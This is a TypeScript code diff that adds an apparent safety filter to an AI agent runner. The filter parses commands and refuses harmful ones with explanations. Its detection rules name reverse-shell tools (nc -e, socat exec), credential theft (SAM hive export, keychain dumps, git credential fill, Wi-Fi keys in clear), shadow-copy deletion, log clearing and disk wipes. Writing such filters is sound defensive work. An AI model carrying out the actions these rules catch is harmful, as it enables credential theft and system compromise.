+      else if (WINDOWS_SHELLS.test(head)) windows(head, f);
+      else if (FED_COMMANDS.test(head)) looseScan(f, false, depth + 1, out);
+      else if (CODE_RUNNERS.test(head)) looseScan(f, true, depth + 1, out);
+    }
+    fed = sep === "|" && /^(echo|printf)$/.test(head) ? [...quoted, argv.slice(1).join(" ")] : [];
+    if (LAUNCHERS.test(head)) {
+      for (let k = 1; k < argv.length && k < 8; k++) {
+        if ((argv[k] as string).startsWith("-")) continue;
+        const launched = looseArgv(argv.slice(k));
+        out.push({ raw: argv.slice(k), argv: launched, writes: [], reads: [] });
+        windowsRun(launched);
+      }
+    }
+    if (head === "find") {
+      const at = argv.findIndex((a) => /^-(exec|execdir|ok|okdir)$/.test(a));
+      if (at >= 0) {
+        const found = looseArgv(argv.slice(at + 1));
+        out.push({ raw: argv.slice(at + 1), argv: found, writes: [], reads: [] });
+        windowsRun(found);
+      }
+    }
+    windowsRun(argv);
+    if (code || RUNS_ITS_WORDS.test(head) || RUNS_ITS_WORDS.test(rawHead)) {
+      for (const q of quoted) looseScan(q, !code && CODE_RUNNERS.test(head), depth + 1, out);
+    }
+    words = [];
+    quoted = [];
+    writes = [];
+    reads = [];
+    target = null;
+  };
+  for (let i = 0; i < shell.length; i++) {
+    const c = shell[i] as string;
+    if (c === "'" || c === '"') {
+      let j = i + 1;
+      while (j < shell.length && shell[j] !== c) j += c === '"' && shell[j] === "\\" ? 2 : 1;
+      const inner = shell.slice(i + 1, j);
+      cur += inner;
+      has = true;
+      // What `$(…)` and backticks run inside double quotes runs whoever gets the word.
+      if (!code && c === '"' && /\$\(|`/.test(inner)) looseScan(inner, false, depth + 1, out);
+      else if (!code || /[\s;&|]/.test(inner)) quoted.push(inner);
+      i = j;
+      continue;
+    }
+    if (c === "\\") {
+      if (i + 1 < shell.length) cur += shell[i + 1];
+      has = true;
+      i++;
+      continue;
+    }
+    if (c === "$" && shell[i + 1] === "{") {
+      const end = shell.indexOf("}", i);
+      const stop = end < 0 ? shell.length : end;
+      cur += shell.slice(i, stop + 1);
+      has = true;
+      i = stop;
+      continue;
+    }
+    if ((c === "$" || c === "<" || c === ">") && shell[i + 1] === "(") {
+      endCommand();
+      i++;
+      continue;
+    }
+    if (c === "&" && shell[i + 1] === ">") {
+      endWord();
+      i += shell[i + 2] === ">" ? 2 : 1;
+      target = "write";
+      continue;
+    }
+    if (c === ">") {
+      if (/^\d+$/.test(cur)) {
+        cur = "";
+        has = false;
+      } else endWord();
+      while (shell[i + 1] === ">" || shell[i + 1] === "|") i++;
+      // `2>&1`, `>&2`: a descriptor, not a file.
+      if (shell[i + 1] === "&" && /[\d-]/.test(shell[i + 2] ?? "")) {
+        i += 2;
+        continue;
+      }
+      target = "write";
+      continue;
+    }
+    if (c === "<") {
+      endWord();
+      if (shell.startsWith("<<<", i)) i += 2;
+      else target = "read";
+      continue;
+    }
+    if (";&|\n(){}`".includes(c)) {
+      endCommand(c);
+      continue;
+    }
+    if (c === " " || c === "\t" || c === "\r" || (code && (c === "," || c === "[" || c === "]"))) {
+      endWord();
+      continue;
+    }
+    cur += c;
+    has = true;
+  }
+  endCommand();
+}
+
+const SECRETS = "it touches secrets";
+const ENCODED = "it runs code it hides by encoding it";
+const ENV_OUT = "it sends out its whole environment, which holds its keys";
+const PRIVILEGE_REASON = "it asks for more rights than the agent's own user has";
+const SYSTEM_REASON = "it changes the system";
+const RUNNER = "it touches the runner that connects this computer";
+const REVERSE = "it hands a shell on this computer to another machine";
+const WIPE = "it would wipe the computer or a whole home folder";
+const NETWORK = "it changes or goes around the computer's proxy and firewall";
+const OTHER = "it reaches into another user's files";
+
+/** What a refusal of each reason carries: the code the apps say in the person's words, and what to do instead. */
+const BAD_ACTOR: Record<string, { code: string; hint: string }> = {
+  [SECRETS]: { code: "secret", hint: SECRET_MESSAGE },
+  [ENV_OUT]: { code: "secret", hint: "Send only the values the work needs, each by its name." },
+  [ENCODED]: { code: "unclear", hint: "Run the commands or the code themselves, as plain text, so they can be read." },
+  [PRIVILEGE_REASON]: {
+    code: "privilege",
+    hint: "Run it as the agent's own user, without sudo: installs into its own user work (npm i -g, pip install --user, cargo install).",
+  },
+  [SYSTEM_REASON]: {
+    code: "system",
+    hint: "Keep changes to your own files and user; system folders (/etc, /usr, /boot…), system services, disks and kernel settings stay as they are.",
+  },
+  [RUNNER]: { code: "system", hint: "Leave the runner, its files and its process as they are." },
+  [REVERSE]: {
+    code: "reverseShell",
+    hint: "To work on another machine, connect out to it with ssh, or call its API with curl.",
+  },
+  [WIPE]: { code: "destroy", hint: "Delete only the files and folders the work itself made, by their paths." },
+  [NETWORK]: {
+    code: "network",
+    hint: "Leave the proxy variables, the firewall and the routes as they are; if an address can't be reached, tell the person which one.",
+  },
+  [OTHER]: { code: "otherUser", hint: "Work in your own folder and home." },
 };
 
-export const forbiddenCode = (reason: string) => FORBIDDEN_CODES[reason] ?? "rules";
+/** A refusal by `badActorReason`: the real reason, what to do instead, and that the rest of the work goes on. */
+export function badActorRefusal(reason: string): { message: string; code: string } {
+  const r = BAD_ACTOR[reason];
+  return {
+    message: `This was refused because ${reason}. ${r ? `${r.hint} ` : ""}Plain commands, scripts, installs, ssh and HTTP calls of any kind still run, so carry on with the rest of the work; if it truly needs this step, tell the person in plain words what is needed and why. ${NO_TERMINAL_COMMANDS}`,
+    code: r?.code ?? "rules",
+  };
+}
+
+/** An address or another machine's path (`host:/srv`, `user@host:~/x`): not this computer's file (`C:\\x` is). */
+const elsewhere = (p: string) =>
+  !/^[a-z]:[\\/]/i.test(p) &&
+  (/^[a-z][\w+.-]*:\/\//i.test(p) || (!p.startsWith("/") && /^([\w.-]+@)?[\w.-]+:/.test(p)));
+
+/** A path in another user's home (`/home/x`, `/Users/x`, `/root`, `~x`) where neither the agent's home nor its folders are. */
+function otherHome(p: string, scope: CommandScope) {
+  if (!scope.home) return false;
+  if (/^~[A-Za-z_]/.test(p)) return true;
+  if (!p.startsWith("/")) return false;
+  const m = /^\/((home|Users)\/[^/]+|root)(\/|$)/.exec(path.resolve(p));
+  if (!m || m[1] === "Users/Shared") return false;
+  const top = `/${m[1]}`;
+  return ![scope.home, scope.cwd, ...scope.folders].some((f) => under(path.resolve(f), top));
+}
+
+/** Why a word a command reads or names is refused: a credential store, the runner, another user's home. */
+function wordProblem(word: string, scope: CommandScope): string | null {
+  const p = word
+    .replace(/^--?[\w-]+=/, "")
+    .replace(/^[A-Za-z_]\w*=/, "")
+    .replace(/^[@<]/, "")
+    .replace(/^file:\/\//, "");
+  if (!p || elsewhere(p)) return null;
+  if (/agentes-runner/i.test(p) && /[/\\~]/.test(p) && !insideFolders(scope, p)) return RUNNER;
+  if (storeSecret(p, scope)) return SECRETS;
+  return otherHome(p, scope) ? OTHER : null;
+}
+
+/** Why a file a command writes is refused: the system's, a credential store (a project's `.env` aside), the runner's. */
+function writeProblem(file: string, scope: CommandScope): string | null {
+  if (!file || elsewhere(file)) return null;
+  if (/agentes-runner/i.test(file) && !insideFolders(scope, file)) return RUNNER;
+  const r = resolveIn(scope, file);
+  if (r === null) return OTHER;
+  if (SYSTEM_DIRS.test(r)) return SYSTEM_REASON;
+  if (storeSecret(file, scope)) return SECRETS;
+  return otherHome(file, scope) ? OTHER : null;
+}
+
+const DEST_LAST = new Set(["cp", "mv", "ln", "install", "rsync"]);
+const EVERY_ARG = new Set([
+  "tee",
+  "touch",
+  "mkdir",
+  "rm",
+  "rmdir",
+  "truncate",
+  "unlink",
+  "shred",
+  "chmod",
+  "chown",
+  "chgrp",
+  "chattr",
+  "chflags",
+]);
+
+/** The files a command writes, deletes or changes the mode of: its redirections, and its arguments by what it is. */
+function writeTargets(cmd: string, args: readonly string[], redirects: readonly string[]): string[] {
+  const plain = args.filter((a) => !a.startsWith("-"));
+  const out = [...redirects];
+  if (DEST_LAST.has(cmd)) {
+    const t = args.findIndex((a) => a === "-t" || a === "--target-directory");
+    const glued = args.find((a) => a.startsWith("--target-directory="));
+    out.push(glued?.slice(19) ?? (t >= 0 ? (args[t + 1] ?? "") : (plain.at(-1) ?? "")));
+  } else if (
+    EVERY_ARG.has(cmd) ||
+    ((cmd === "sed" || cmd === "perl") && args.some((a) => /^-[a-zA-Z]*i|^--in-place/.test(a)))
+  ) {
+    out.push(...plain);
+  } else if (cmd === "dd") out.push(...args.filter((a) => a.startsWith("of=")).map((a) => a.slice(3)));
+  return out.filter(Boolean);
+}
+
+/**
+ * Whether the words print the whole environment (`env`, `printenv`, `set`, `export -p`, `declare -x`, PowerShell's
+ * `Get-ChildItem Env:`).
+ */
+function envDump(raw: readonly string[]) {
+  const [head = "", ...rest] = raw.filter((w) => !ASSIGNMENT.test(w));
+  const b = baseName(head);
+  return (
+    ((b === "env" || b === "printenv") && rest.every((a) => a.startsWith("-"))) ||
+    (b === "set" && rest.length === 0) ||
+    (/^(get-childitem|gci|dir|ls)$/.test(b) && rest.length === 1 && /^env:[\\/]?\*?$/i.test(rest[0] ?? "")) ||
+    (b === "export" && rest.length === 1 && rest[0] === "-p") ||
+    (b === "declare" && /^-[a-zA-Z]*[xp]/.test(rest[0] ?? "")) ||
+    (b === "compgen" && rest[0] === "-v")
+  );
+}
+
+/**
+ * Whether a path is the whole computer, a top-level folder or a whole home (`rm -rf ../../..`, `rm -rf /home/ada`),
+ * on a Windows drive too, read from its root (`C:\`, `/c/Users/ada`).
+ */
+function wholeTree(word: string, scope: CommandScope) {
+  const p = word.replaceAll("\\", "/");
+  const w = DRIVE.test(p) ? p.replace(DRIVE, "") || "/" : p;
+  if (WHOLE_TREE.test(w)) return true;
+  const r = resolveIn(scope, w.replace(/\/\*$/, ""));
+  return (
+    r !== null &&
+    (WHOLE_TREE.test(r) ||
+      /^\/(home|Users)\/[^/]+$/i.test(r) ||
+      (scope.home !== undefined && r === path.resolve(scope.home)))
+  );
+}
+
+/** `find`'s starting points: its words before the first test or action. */
+const findRoots = (args: readonly string[]) => {
+  const end = args.findIndex((a) => /^[-(!]/.test(a) && !/^-[HLP]$/.test(a));
+  return args.slice(0, end < 0 ? args.length : end).filter((a) => !/^-[HLP]$/.test(a));
+};
+
+/**
+ * A container given the host: `--privileged`, the host's namespaces or admin capabilities, `/` or Docker's socket
+ * mounted. Under the agent's own rootless engine all of that stays the agent's, but the host's processes.
+ */
+function hostAccess(args: readonly string[], scope: CommandScope) {
+  return args.some((a, i) => {
+    const next = args[i + 1] ?? "";
+    if (scope.rootlessContainers) return /^--pid=host$/i.test(a) || (a === "--pid" && next === "host");
+    if (
+      /^--privileged$|^--(pid|ipc|userns|uts|cgroupns)=host$|^--cap-add=(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(a)
+    )
+      return true;
+    if (/^--(pid|ipc|userns|uts|cgroupns)$/.test(a) && next === "host") return true;
+    if (a === "--cap-add" && /^(ALL|SYS_ADMIN|SYS_MODULE|SYS_PTRACE)$/i.test(next)) return true;
+    const mount =
+      a === "-v" || a === "--volume"
+        ? next.split(":")[0]
+        : /^(-v|--volume=)/.test(a)
+          ? a.replace(/^(-v|--volume=)/, "").split(":")[0]
+          : a === "--mount" || a.startsWith("--mount=")
+            ? /(?:^|,)(?:source|src)=([^,]+)/.exec(a === "--mount" ? next : a.slice(8))?.[1]
+            : undefined;
+    if (!mount) return false;
+    const r = resolveIn(scope, mount);
+    return r === "/" || /docker\.sock$|podman\.sock$/.test(mount);
+  });
+}
+
+/**
+ * A cmdlet or alias by one of `names` (lower case), alone or by its module (`Defender\Set-MpPreference`), but not part
+ * of a path or a file's name (`./scripts/new-service.ts`).
+ */
+const cmdlet = (names: string) => new RegExp(String.raw`(?<![\w./\\:-])([a-z][\w.]*[\\/])?(${names})(?![\w./\\-])`);
+/** The registry's drives and paths (`HKCU:`, `HKEY_LOCAL_MACHINE\…`, `Registry::…`). */
+const HIVE = /\b(hk(lm|cu|cr|u|cc):|hkey_|registry::)/;
+/** The item cmdlets and their aliases: a change to the registry where their path is in it. */
+const ITEM_CHANGE = cmdlet(
+  "(new|set|remove|rename|copy|move|clear)-item(property)?|ni|si|sp|ri|rp|rni|rnp|cpi|cpp|cp|copy|mi|mp|mv|move|cli|clp|del|erase|rd|rm|rmdir",
+);
+/** The location set to the registry (`cd HKCU:\…`), where every later path is in it. */
+const IN_HIVE = new RegExp(
+  String.raw`${cmdlet("cd|chdir|sl|set-location|pushd|push-location").source}\s+(-(literal)?path\s+)?['"]?${HIVE.source}`,
+);
+/** A variable given a registry path (`$k = "HKCU:\…"`). */
+const HIVE_VARIABLE = new RegExp(String.raw`(\$[\w:]+)\s*=\s*['"]?${HIVE.source}`, "g");
+
+/**
+ * PowerShell's changes to the system, each read in one statement of its text (in lower case, all of a row's patterns
+ * in the same statement): cmdlets and their usual aliases. Reads (`Get-*`, `Test-*`) aren't here.
+ */
+const POWERSHELL_CHANGES: ReadonlyArray<readonly [string, ...RegExp[]]> = [
+  [PRIVILEGE_REASON, /-verb[\s:]+['"]?runas/],
+  [SYSTEM_REASON, cmdlet("(set|add)-mppreference")],
+  // Without a scope it sets the machine's policy; `CurrentUser` and `Process` are the agent's own.
+  [SYSTEM_REASON, cmdlet("set-executionpolicy"), /^(?!.*\b(currentuser|process)\b)/],
+  [SYSTEM_REASON, ITEM_CHANGE, HIVE],
+  [SYSTEM_REASON, cmdlet("(register|set|unregister|enable|disable)-scheduledtask")],
+  [SYSTEM_REASON, cmdlet("(new|set|remove|stop|suspend|restart)-service|spsv")],
+  [SYSTEM_REASON, cmdlet("(new|set|remove|enable|disable|rename|add)-local(user|group|groupmember)")],
+  [SYSTEM_REASON, cmdlet("(clear|remove)-eventlog")],
+  [WIPE, cmdlet("clear-disk|format-volume|initialize-disk|remove-partition")],
+  [NETWORK, cmdlet(String.raw`(new|set|enable|disable|remove|copy|rename)-netfirewall\w*`)],
+  [NETWORK, cmdlet("(new|set|remove)-netroute")],
+  [NETWORK, cmdlet("invoke-webrequest|iwr|invoke-restmethod|irm"), /\s-(no)?proxy\b/],
+  // The runner stopped by name, piped too (`Get-Process agentes-runner | Stop-Process`, `(gps agentes-runner).Kill()`).
+  [RUNNER, /agentes-runner/, cmdlet("stop-process|spps|kill")],
+  [RUNNER, /agentes-runner/, /\.kill\(/],
+];
+
+/**
+ * Why a PowerShell text is refused: its first statement with a change to the system (`POWERSHELL_CHANGES`), or one
+ * carried across statements: shadow copies deleted in a script block (`gwmi win32_shadowcopy | % { $_.Delete() }`),
+ * the registry changed by the location or a variable (`cd HKCU:\…; ni .`, `$k = "HKCU:\…"; sp $k …`).
+ */
+function powershellProblem(text: string): string | null {
+  const flat = text.toLowerCase();
+  if (/\bwin32_shadowcopy\b/.test(flat) && /\.delete\(|\bremove-(ciminstance|wmiobject)\b/.test(flat))
+    return SYSTEM_REASON;
+  const inHive = IN_HIVE.test(flat);
+  const held = new Set([...flat.matchAll(HIVE_VARIABLE)].map((m) => m[1]));
+  for (const statement of flat.split(/[;\n{}]/)) {
+    if (ITEM_CHANGE.test(statement) && (inHive || [...statement.matchAll(/\$[\w:]+/g)].some((v) => held.has(v[0]))))
+      return SYSTEM_REASON;
+    const hit = POWERSHELL_CHANGES.find(([, ...all]) => all.every((r) => r.test(statement)));
+    if (hit) return hit[0];
+  }
+  return null;
+}
+
+/** PowerShell's options that take the next word (`-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-Version 5`). */
+const POWERSHELL_VALUE = /^(ep|ex\w*|w\w*|v\w*|if|inp\w*|of|o|out\w*|psc\w*|con\w*|settings\w*|cus\w*)$/;
+
+/**
+ * What a Windows shell runs: `cmd`'s words after `/c`, `/k` or `/r`; PowerShell's `-EncodedCommand` (`-enc`, `-e`:
+ * base64 of UTF-16LE text) decoded, its words after `-Command` (`-c`), or from its first word that isn't an option on
+ * (the command, to Windows PowerShell). Null for a script file (`-File`) or nothing to run. Git Bash keeps a switch
+ * from being read as a path when it is doubled (`cmd //c`).
+ */
+function windowsScript(shell: string, args: readonly string[]): string | null {
+  for (let i = 0; i < args.length; i++) {
+    const word = args[i] as string;
+    const flag = /^(\/\/?|--?)/.test(word) ? word.replace(/^(\/\/?|--?)/, "").toLowerCase() : null;
+    if (shell === "cmd") {
+      if (flag === "c" || flag === "k" || flag === "r") return args.slice(i + 1).join(" ");
+      continue;
+    }
+    if (flag === null) return args.slice(i).join(" ");
+    if (flag === "ec" || (flag !== "" && "encodedcommand".startsWith(flag)))
+      return Buffer.from(args[i + 1] ?? "", "base64").toString("utf16le");
+    if (flag === "c" || flag === "cwa" || (flag.length > 2 && "commandwithargs".startsWith(flag)))
+      return args.slice(i + 1).join(" ");
+    if (flag === "f" || (flag.length > 1 && "file".startsWith(flag))) return null;
+    if (POWERSHELL_VALUE.test(flag)) i++;
+  }
+  return null;
+}
+
+/**
+ * Whether a path is outside the agent's folders, for what changes who may use a file. The server knows a computer's
+ * folders as POSIX paths only, so a Windows drive, a share or a variable is outside; a relative path stays in the
+ * folder it runs in unless it climbs out of it.
+ */
+function outsideFolders(scope: CommandScope, p: string) {
+  const q = p.replaceAll("\\", "/");
+  if (/^([a-z]:|\/\/|[%$])/i.test(q)) return true;
+  if (q.startsWith("/") || q.startsWith("~")) return !insideOrTmp(scope, q);
+  return path.posix.normalize(q).split("/")[0] === "..";
+}
+
+/** cmd's switches: one letter each, alone or chained (`/s`, `/s/q`, `/a:h`), doubled in Git Bash (`//s`). */
+const CMD_SWITCH = /^(\/\/?[a-z?](:[^\s/]*)?)+$/i;
+/** sc's subcommands that change a service (`query`, `qc` and `start` don't). */
+const SC_CHANGES =
+  /^(create|config|delete|stop|pause|failure|failureflag|sdset|privs|sidtype|triggerinfo|managedaccount|control)$/i;
+/** icacls's and cacls's switches that change who may use a file (`/grant:r`, `/inheritance:d`, `/g`, `/s:SDDL`). */
+const ACL_CHANGES =
+  /^(\/\/?|-)((grant|deny|remove|setowner|setintegritylevel|reset|inheritance|restore|substitute)(:\w+)?|[gpdr]|s:\S+)$/i;
+
+/**
+ * Why a Windows command is refused: more rights (`runas`), the system changed (the registry, scheduled tasks,
+ * services, boot, backups, event logs, accounts, who may use a file outside the agent's folders), a disk wiped, the
+ * firewall, proxy or routes changed, the system's secrets read. PowerShell's cmdlets are `powershellProblem`'s.
+ * Reads run: `reg query`, `schtasks /query`, `sc query`, `netsh … show`, `icacls` without a change.
+ */
+function windowsProblem(cmd: string, args: readonly string[], scope: CommandScope): string | null {
+  const sub = (args[0] ?? "").toLowerCase();
+  const has = (re: RegExp) => args.some((a) => re.test(a));
+  if (cmd === "runas") return PRIVILEGE_REASON;
+  if (cmd === "diskpart" || (cmd === "format" && has(/^[a-z]:[\\/]?$/i))) return WIPE;
+  if (cmd === "bcdedit") return SYSTEM_REASON;
+  if (cmd === "reg") {
+    if (/^(add|delete|import|restore|load|unload|copy)$/.test(sub)) return SYSTEM_REASON;
+    // The hives that hold the computer's password hashes and the keys that open them.
+    if (
+      /^(save|export)$/.test(sub) &&
+      /^hk(lm|ey_local_machine)[\\/]*(sam|security|system)[\\/]*$/i.test(args[1] ?? "")
+    )
+      return SECRETS;
+  }
+  if (cmd === "schtasks" && has(/^(\/\/?|-)(create|change|delete)$/i)) return SYSTEM_REASON;
+  // `sc \\host create …` names another computer first.
+  if (cmd === "sc" && args.slice(0, 2).some((a) => SC_CHANGES.test(a))) return SYSTEM_REASON;
+  if (
+    (cmd === "vssadmin" && /^(delete|resize)$/.test(sub)) ||
+    (cmd === "wbadmin" && sub === "delete") ||
+    (cmd === "wevtutil" && /^(cl|clear-log)$/.test(sub)) ||
+    (cmd === "wmic" && has(/^shadowcopy$/i) && has(/^delete$/i))
+  )
+    return SYSTEM_REASON;
+  if (cmd === "net") {
+    if (/^(stop|pause)$/.test(sub)) return SYSTEM_REASON;
+    // Any switch but `/domain` adds, removes or changes an account or a group; a second word after the name is its
+    // new password.
+    const words = args.slice(1).filter((a) => !/^(\/\/?|-)/.test(a));
+    if (
+      /^(users?|localgroup|group)$/.test(sub) &&
+      (has(/^(\/\/?|-)(?!domain$)\w/i) || (/^users?$/.test(sub) && words.length > 1))
+    )
+      return SYSTEM_REASON;
+  }
+  if (cmd === "netsh") {
+    if (has(/^wlan$/i) && has(/^key=clear$/i)) return SECRETS;
+    if (has(/^(set|add|delete|reset|import|restore|install|uninstall)$/i)) return NETWORK;
+  }
+  // icacls and cacls only show who may use a file unless a switch changes it; takeown always takes it.
+  if (cmd === "takeown" || ((cmd === "icacls" || cmd === "cacls") && has(ACL_CHANGES))) {
+    const f = args.findIndex((a) => /^(\/\/?|-)f$/i.test(a));
+    const target = cmd === "takeown" ? (f >= 0 ? args[f + 1] : undefined) : args[0];
+    if (target !== undefined && outsideFolders(scope, target)) return SYSTEM_REASON;
+  }
+  return null;
+}
+
+function commandProblem(s: Loose, scope: CommandScope): string | null {
+  if (s.powershell !== undefined) return textProblem(s.powershell) ?? powershellProblem(s.powershell);
+  const [first = "", ...args] = s.argv;
+  const cmd = baseName(first);
+  if (PRIVILEGE.test(cmd)) return PRIVILEGE_REASON;
+  if (WIPE_TOOLS.test(cmd)) return WIPE;
+  if (cmd === "dd" && args.some((a) => /^of=\/dev\/(?!(null|zero|stdout|stderr|shm)(\/|$))/.test(a))) return WIPE;
+  if (cmd === "diskutil" && /^(erase\w*|reformat|partitionDisk|zeroDisk|randomDisk|secureErase)$/i.test(args[0] ?? ""))
+    return WIPE;
+  const recursive = args.some((a) => /^-[a-zA-Z]*[rR]/.test(a) || a === "--recursive");
+  // cmd's `rd /s` and `del /s` (`/s/q` too), PowerShell's `Remove-Item -Recurse`. A path from the drive's root isn't a
+  // switch (`\Users`, read as `/Users`), and a parameter may carry its path (`-Path:C:\`).
+  const windowsDelete =
+    /^(rd|rmdir|del|erase|remove-item|ri)$/.test(cmd) &&
+    (recursive || args.some((a) => CMD_SWITCH.test(a) && /(^|\/)s(\W|$)/i.test(a)));
+  if (
+    args.includes("--no-preserve-root") ||
+    (/^(rm|chmod|chown|chgrp)$/.test(cmd) &&
+      recursive &&
+      args.some((a) => !a.startsWith("-") && wholeTree(a, scope))) ||
+    (windowsDelete &&
+      args.some((a) => {
+        const p = a.replace(/^-\w+:/, "");
+        return !p.startsWith("-") && !CMD_SWITCH.test(p) && wholeTree(p, scope);
+      }))
+  )
+    return WIPE;
+  if (cmd === "find" && args.includes("-delete") && findRoots(args).some((a) => wholeTree(a, scope))) return WIPE;
+  const plain = args.filter((a) => !a.startsWith("-"));
+  if (
+    (cmd === "mv" && plain.slice(0, -1).some((a) => wholeTree(a, scope))) ||
+    (cmd === "rsync" && args.some((a) => a.startsWith("--delete")) && wholeTree(plain.at(-1) ?? "", scope))
+  )
+    return WIPE;
+  if (/^(docker|podman)$/.test(cmd) && args.some((a) => a === "run" || a === "create") && hostAccess(args, scope))
+    return PRIVILEGE_REASON;
+  if (
+    (cmd === "security" &&
+      (/^(dump-keychain|export)$/.test(args[0] ?? "") ||
+        (/^find-(generic|internet)-password$/.test(args[0] ?? "") && args.some((a) => /^-[a-zA-Z]*[wg]/.test(a))))) ||
+    (cmd === "git" && args.includes("credential") && args.includes("fill")) ||
+    ((/^(git|docker)-credential-/.test(cmd) || (cmd === "git" && args.some((a) => a.startsWith("credential-")))) &&
+      args.includes("get"))
+  )
+    return SECRETS;
+  // The runner by name: stopped or killed (a search for the name, `pgrep` and a status are not), on Windows by
+  // `taskkill` or `tskill` (PowerShell's `Stop-Process`: `POWERSHELL_CHANGES`).
+  if (
+    args.some((a) => /agentes-runner/i.test(a)) &&
+    (/^(pkill|killall|taskkill|tskill)$/.test(cmd) ||
+      (cmd === "systemctl" && args.some((a) => SYSTEMCTL_CHANGES.test(a))) ||
+      (cmd === "service" && args.some((a) => /^(stop|restart|reload)$/.test(a))) ||
+      (cmd === "launchctl" && args.some((a) => /^(bootout|unload|stop|kill|remove|disable)$/.test(a))))
+  )
+    return RUNNER;
+  if (/^(nc|ncat|netcat)$/.test(cmd) && args.some((a) => /^-[a-zA-Z]*[ec]|^--(exec|sh-exec|lua-exec)/.test(a)))
+    return REVERSE;
+  if (cmd === "socat" && args.some((a) => /(^|[,!])(exec|system):/i.test(a))) return REVERSE;
+  if (SYSTEM_TOOLS.test(cmd)) return SYSTEM_REASON;
+  if (cmd === "systemctl" && !args.includes("--user") && args.some((a) => SYSTEMCTL_CHANGES.test(a)))
+    return SYSTEM_REASON;
+  if (cmd === "service" && args.some((a) => /^(start|stop|restart|reload|force-reload)$/.test(a))) return SYSTEM_REASON;
+  if (cmd === "sysctl" && args.some((a) => /^(-w|-p|--write|--load|--system)$/.test(a) || /^[\w.]+=/.test(a)))
+    return SYSTEM_REASON;
+  if (cmd === "launchctl" && args.some((a) => /^system(\/|$)/.test(a) || a.startsWith("/Library/")))
+    return SYSTEM_REASON;
+  if (cmd === "git" && args.includes("--system")) return SYSTEM_REASON;
+  if (FIREWALL_TOOLS.test(cmd)) return NETWORK;
+  // Windows' `route ADD` takes any case, and its `-f` clears every gateway.
+  if (
+    ((cmd === "ip" || cmd === "route") &&
+      args.some((a) => /^(add|del|delete|change|replace|flush|set|append)$/i.test(a))) ||
+    (cmd === "route" && args.includes("-f"))
+  )
+    return NETWORK;
+  if (
+    cmd === "curl" &&
+    args.some((a) =>
+      /^(-x|--proxy|--noproxy|--preproxy|--socks4a?|--socks5(-hostname)?)$|^--(proxy|noproxy|preproxy|socks\w*)=/.test(
+        a,
+      ),
+    )
+  )
+    return NETWORK;
+  if (cmd === "wget" && args.some((a) => a === "--no-proxy" || /^(use_proxy|https?_proxy|no_proxy)=/i.test(a)))
+    return NETWORK;
+  if (cmd === "git" && args.some((a) => /^https?\.(\S+\.)?proxy(=|$)/i.test(a))) return NETWORK;
+  const windows = windowsProblem(cmd, args, scope);
+  if (windows) return windows;
+  const written = writeTargets(cmd, args, s.writes);
+  for (const file of written) {
+    const why = writeProblem(file, scope);
+    if (why) return why;
+  }
+  const keys = new Set(s.argv.filter((_, i) => i > 0 && sshKeyArg(s.argv, i)));
+  for (const word of [...s.raw, ...s.reads]) {
+    if (written.includes(word) || keys.has(word)) continue;
+    const why = wordProblem(word, scope);
+    if (why) return why;
+  }
+  return null;
+}
+
+/** What a text says as a whole: a shell handed out, a fork bomb, the proxy gone around, the runner's variables, hidden code. */
+function textProblem(flat: string): string | null {
+  if (REVERSE_SHELL.some((all) => all.every((r) => r.test(flat)))) return REVERSE;
+  if (FORK_BOMB.test(flat)) return WIPE;
+  if (PROXY_TEXT.some((r) => r.test(flat)) || proxyBypass(flat)) return NETWORK;
+  if (RUNNER_VARIABLE.test(flat)) return RUNNER;
+  if (ENCODED_RUN.some((all) => all.every((r) => r.test(flat)))) return ENCODED;
+  return null;
+}
+
+/** `badActorReason` for a text: a shell command (`code` false) or Python/JavaScript code. */
+function badText(text: string, code: boolean, scope: CommandScope): string | null {
+  const flat = text.replace(/\\\r?\n/g, " ");
+  const whole = textProblem(flat);
+  if (whole) return whole;
+  if (code && ENV_DUMP_CODE.test(flat) && NET_CODE.test(flat)) return ENV_OUT;
+  const cmds: Loose[] = [];
+  looseScan(flat, code, 0, cmds);
+  let dumps = false;
+  let sends = false;
+  for (const s of cmds) {
+    const why = commandProblem(s, scope);
+    if (why) return why;
+    dumps ||= envDump(s.raw);
+    sends ||= SENDERS.test(baseName(s.argv[0] ?? ""));
+  }
+  return dumps && sends ? ENV_OUT : null;
+}
+
+/**
+ * Why a call of a run outside a mission is refused (ADR 0053 §3, addendum 2026-11-19), or null: it runs. Only
+ * obvious harm: secrets read, printed or sent; more rights (sudo, su); changes to the system, its services, disks
+ * and kernel; a shell handed to another machine; wiping the computer or a home; the proxy, firewall or routes
+ * changed or gone around; the runner; another user's files. Everything else is ordinary work: HTTP calls of any
+ * method, ssh and rsync, pushes, pipes, heredocs, `$(…)`, `bash -c`, inline code, installs into the agent's own
+ * user. The whole text is read, so a `bash -c`, a heredoc or inline code hides nothing that plain matching can see.
+ */
+export function badActorReason(
+  toolName: string,
+  input: Record<string, unknown> | null | undefined,
+  scope: CommandScope,
+): string | null {
+  const file = FILE_WRITE_TOOLS.has(toolName)
+    ? [input?.file_path, input?.notebook_path].find((v): v is string => typeof v === "string")
+    : undefined;
+  if (file !== undefined) return namesSecret(file, scope) ? SECRETS : writeProblem(file, scope);
+  if (toolName !== "Bash") return null;
+  return badText(typeof input?.command === "string" ? input.command : "", false, scope);
+}
+
+/** `badActorReason` for `run_code`'s code (`language`: bash, python or node), where the computer's folders aren't known. */
+export const badActorCode = (code: string, language: string) =>
+  badText(code, language !== "bash", { cwd: "/nonexistent", folders: [] });
 
 // ── "Aprovar sempre" for a command: its kind ──────────────────────────────────
 
